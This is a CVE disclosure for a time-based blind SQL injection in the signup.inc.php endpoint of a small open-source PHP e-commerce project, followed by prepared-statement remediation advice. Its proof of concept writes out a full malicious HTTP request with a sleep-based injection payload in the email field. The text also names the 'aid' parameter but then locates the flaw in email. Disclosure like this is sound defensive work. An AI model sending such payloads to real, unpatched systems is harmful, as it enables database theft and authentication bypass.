# 🛡️ CVE Disclosure: CVE-2025-61455 — SQL Injection in E-commerce Project

**Disclosure Date:** 14 October 2025  
**CVE ID:** CVE-2025-61455  
**Severity:** CRITICAL (CVSS 9.8)

---

## 🧩 Summary

A critical SQL Injection vulnerability exists in `E-commerce Project v1.0`, specifically within the `signup.inc.php` endpoint. The application directly incorporates unsanitized user inputs into SQL queries, allowing unauthenticated attackers to bypass authentication and execute arbitrary SQL commands.

This issue has been assigned the identifier **CVE-2025-61455**. At the time of public disclosure, **no official patch** was available.

---

## 📦 Affected Product

- **Vendor:** Independent (Bhabishya-123)
- **Project:** [E-commerce](https://github.com/Bhabishya-123/E-commerce)
- **Version:** v1.0
- **File:** `signup.inc.php`
- **Vulnerable Endpoint:**  
  `https://localhost/e-commerce-main/includes/signup.inc.php`

---

## 🔬 Vulnerability Details

The application uses unsanitized input directly in SQL queries without any input validation or prepared statements. The vulnerability exists in the `aid` parameter of the `signup.inc.php` file.

An attacker can inject malicious SQL code through the email parameter, enabling time-based blind SQL injection attacks.

**Example vulnerable code pattern:**
```php
$query = "SELECT * FROM table WHERE email='$email'";
```

This allows for injection payloads that can manipulate query logic and extract sensitive data.

## 💥 Impact

A successful exploitation could result in:

- ✅ Full **authentication bypass**
- 🔓 **Unauthorized access** to privileged features
- 📊 **Data exfiltration** through time-based blind SQL injection
- 🛠️ Potential **data manipulation or deletion**
- ⚠️ Full **compromise of the backend database**
- 💻 Potential for **remote code execution**

---

## 🧪 Proof of Concept (PoC)

### 1. Clone the Repository

```bash
git clone https://github.com/Bhabishya-123/E-commerce.git
```

### 2. Host Locally

Use XAMPP/LAMP to deploy the project and navigate to:

```
http://localhost/e-commerce-main/includes/signup.inc.php
```

### 3. Payload Injection

Send the following malicious HTTP request:

```http
POST /e-commerce-main/includes/signup.inc.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

name=DvYLInUG&email=fFrhKBwM@burpcollaborator.net'%2b(select*from(select(sleep(20)))a)%2b'&address=BWhKCxUw&number=666897&pwd=n7N%21j3r%21T7&rpwd=k0U%21t0f%21E9&submit=
```

**Explanation:**  
The email parameter contains a time-based SQL injection payload: `'+(select*from(select(sleep(20)))a)+'`

If the application delays for 20 seconds before responding, the SQL injection is successful.

---

## 🔐 Recommendations

- ✅ Replace dynamic SQL queries with **prepared statements** (`mysqli_prepare()` or **PDO**).
- 🔍 Perform **input validation and sanitization** for all user inputs.
- 🧱 Deploy a **Web Application Firewall (WAF)** to block known SQL injection patterns.
- 🛡️ Conduct **regular code audits** and **penetration testing** for early detection.
- 🔒 Implement **parameterized queries** for all database interactions.
- 📝 Use **allowlists** for input validation where possible.
